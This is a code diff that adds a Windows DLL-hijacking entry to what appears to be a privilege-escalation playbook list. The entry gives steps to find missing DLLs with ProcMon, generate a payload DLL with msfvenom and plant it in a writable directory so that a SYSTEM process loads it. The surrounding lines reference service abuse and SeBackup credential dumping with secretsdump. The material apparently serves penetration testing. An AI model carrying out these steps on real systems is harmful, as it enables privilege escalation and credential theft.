@@ -60,6 +60,16 @@ _PLAYS = [
             "    (or PowerUp> Invoke-ServiceAbuse -Name <svc>)",
      "prereq": "write/reconfigure rights on the service and rights to restart it",
      "validate": "the service runs your binary as its service account"},
+    {"id": "win-dll-hijack", "os": "windows",
+     "match": r"dll hijack|writable directory in (system|user) path|writable app dir|"
+              r"service binary directory is writable",
+     "extract": r"((?:[A-Za-z]:\\[^\r\n]+?|PATHdir:|AppDir:|SvcDir:)[^\r\n]*)",
+     "tool": "ProcMon + msfvenom (existing)",
+     "cmd": "ProcMon -> filter Result=NAME NOT FOUND & Path ends .dll for the target; "
+            "msfvenom -f dll -o <MissingDll>.dll; drop it in the writable dir; "
+            "start/restart the exe/service",
+     "prereq": "the writable directory + target exe/service named in the finding",
+     "validate": "your DLL loads in the (often SYSTEM) process"},
     {"id": "win-sebackup", "os": "windows",
      "match": r"sebackup|serestore|setakeownership",
      "tool": "reg save + impacket-secretsdump (existing)",
